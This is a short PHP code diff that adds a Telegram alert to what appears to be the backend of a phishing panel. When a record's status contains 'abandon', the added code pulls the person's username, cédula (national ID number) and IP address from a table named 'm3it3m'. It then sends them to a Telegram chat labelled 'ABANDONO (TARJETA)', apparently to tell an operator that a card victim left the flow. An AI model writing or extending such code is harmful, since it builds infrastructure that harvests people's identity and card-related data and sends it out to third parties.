@@ -97,6 +97,20 @@ try {
     throw new Exception('No se encontró la solicitud con ID: ' . $id);
   }
 
+  // Notificar en Telegram si es abandono
+  $estado_lower = strtolower(trim($new_status));
+  if (str_contains($estado_lower, 'abandon')) {
+    $row = $mysqli->query("SELECT usuario, cedula, ip FROM m3it3m WHERE idreg = " . (int)$id . " LIMIT 1");
+    if ($row && $r = $row->fetch_assoc()) {
+      require_once __DIR__ . '/../include/telegram.php';
+      sendTelegram(
+        "⚠️ <b>ABANDONO (TARJETA)</b>\n" .
+        "👤 <b>" . htmlspecialchars($r['usuario'] ?? '') . "</b> | CC: " . ($r['cedula'] ?? '?') . "\n" .
+        "🌐 IP: <code>" . ($r['ip'] ?? '?') . "</code>"
+      );
+    }
+  }
+
   http_response_code(200);
   echo json_encode([
     'status' => 'OK',
